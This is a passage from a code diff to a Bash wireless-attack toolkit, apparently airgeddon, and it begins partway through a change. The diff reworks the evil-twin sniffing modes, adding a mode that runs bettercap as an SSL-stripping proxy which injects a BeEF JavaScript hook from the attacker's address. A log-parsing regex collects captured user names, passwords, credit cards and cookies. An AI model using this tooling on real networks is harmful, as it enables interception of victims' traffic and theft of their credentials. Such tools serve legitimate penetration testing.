+			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+		fi
 
 		if [ ${bettercap_log} -eq 1 ]; then
 			bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
 		fi
 	fi
 
-	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer+Bettercap-Sslstrip2/BeEF\"" "${bettercap_cmd}" "Sniffer+Bettercap-Sslstrip2/BeEF"
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"${bettercap_window_title}\"" "${bettercap_cmd}" "${bettercap_window_title}"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-		get_tmux_process_id "${bettercap_cmd}"
+		local bettercap_cmd_clean_for_pid_finding
+		bettercap_cmd_clean_for_pid_finding=$(echo "${bettercap_cmd}" | sed 's/ |.*//')
+		get_tmux_process_id "${bettercap_cmd_clean_for_pid_finding}"
 		et_processes+=("${global_process_pid}")
 		global_process_pid=""
 	else
@@ -11097,16 +11106,16 @@ function parse_bettercap_log() {
 	language_strings "${language}" 304 "blue"
 
 	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
-		sed -Ei 's/\x1b\[[0-9;]*m.+\x1b\[[0-9;]K//g' "${tmp_bettercaplog}"
-		sed -Ei 's/\x1b\[[0-9;]*m|\x1b\[J|\x1b\[[0-9;]K|\x8|\xd//g' "${tmp_bettercaplog}"
-		sed -Ei 's/.*»//g' "${tmp_bettercaplog}"
-		sed -Ei 's/^[[:blank:]]*//g' "${tmp_bettercaplog}"
-		sed -Ei '/^$/d' "${tmp_bettercaplog}"
+		sed -Ei 's/\x1b\[[0-9;]*m.+\x1b\[[0-9;]K//g' "${tmp_bettercaplog}" 2> /dev/null
+		sed -Ei 's/\x1b\[[0-9;]*m|\x1b\[J|\x1b\[[0-9;]K|\x8|\xd//g' "${tmp_bettercaplog}" 2> /dev/null
+		sed -Ei 's/.*»//g' "${tmp_bettercaplog}" 2> /dev/null
+		sed -Ei 's/^[[:blank:]]*//g' "${tmp_bettercaplog}" 2> /dev/null
+		sed -Ei '/^$/d' "${tmp_bettercaplog}" 2> /dev/null
 	fi
 
 	local regexp='USER|UNAME|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE|CORREO|MAIL|NET.SNIFF.HTTP.REQUEST.*POST|HTTP\].*POST'
 	local regexp2='USER-AGENT|COOKIES|BEEFHOOK'
-	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | grep -E -i ${regexp} | grep -E -vi ${regexp2})
+	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | grep -E -i "${regexp}" | grep -E -vi "${regexp2}")
 
 	{
 	echo ""
@@ -12705,8 +12714,8 @@ function wps_pin_database_prerequisites() {
 	language_strings "${language}" 384 "blue"
 	echo
 	search_in_pin_database
-	if [ ${bssid_found_in_db} -eq 1 ]; then
-		if [ ${counter_pins_found} -eq 1 ]; then
+	if [ "${bssid_found_in_db}" -eq 1 ]; then
+		if [ "${counter_pins_found}" -eq 1 ]; then
 			language_strings "${language}" 385 "yellow"
 		else
 			language_strings "${language}" 386 "yellow"
@@ -12751,10 +12760,10 @@ function et_prerequisites() {
 			"et_sniffing")
 				language_strings "${language}" 291 "title"
 			;;
-			"et_sniffing_sslstrip")
+			"et_sniffing_sslstrip2")
 				language_strings "${language}" 292 "title"
 			;;
-			"et_sniffing_sslstrip2")
+			"et_sniffing_sslstrip2_beef")
 				language_strings "${language}" 397 "title"
 			;;
 			"et_captive_portal")
@@ -12880,9 +12889,9 @@ function et_prerequisites() {
 
 	if [ -n "${enterprise_mode}" ]; then
 		manage_enterprise_log
-	elif [[ "${et_mode}" = "et_sniffing" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip" ]]; then
+	elif [[ "${et_mode}" = "et_sniffing" ]]; then
 		manage_ettercap_log
-	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
+	elif [[ "${et_mode}" = "et_sniffing_sslstrip2" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]]; then
 		manage_bettercap_log
 	elif [ "${et_mode}" = "et_captive_portal" ]; then
 		manage_captive_portal_log
@@ -12931,11 +12940,11 @@ function et_prerequisites() {
 			"et_sniffing")
 				exec_et_sniffing_attack
 			;;
-			"et_sniffing_sslstrip")
-				exec_et_sniffing_sslstrip_attack
-			;;
 			"et_sniffing_sslstrip2")
 				exec_et_sniffing_sslstrip2_attack
+			;;
+			"et_sniffing_sslstrip2_beef")
+				exec_et_sniffing_sslstrip2_beef_attack
 			;;
 			"et_captive_portal")
 				exec_et_captive_portal_attack
@@ -15499,7 +15508,7 @@ function check_default_route() {
 
 	debug_print
 
-	(set -o pipefail && route | grep "${1}" | grep -E "^default|0\.0\.0\.0" | head -n 1 > /dev/null)
+	(set -o pipefail && ip route | awk '/^default/{print $5}' | grep "${1}" > /dev/null)
 	return $?
 }
 
@@ -15592,8 +15601,8 @@ function remove_warnings() {
 	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
-	echo "${et_sniffing_sslstrip_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_sslstrip2_dependencies[@]}" > /dev/null 2>&1
+	echo "${et_sniffing_sslstrip2_beef_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_captive_portal_dependencies[@]}" > /dev/null 2>&1
 	echo "${wash_scan_dependencies[@]}" > /dev/null 2>&1
 	echo "${bully_attacks_dependencies[@]}" > /dev/null 2>&1
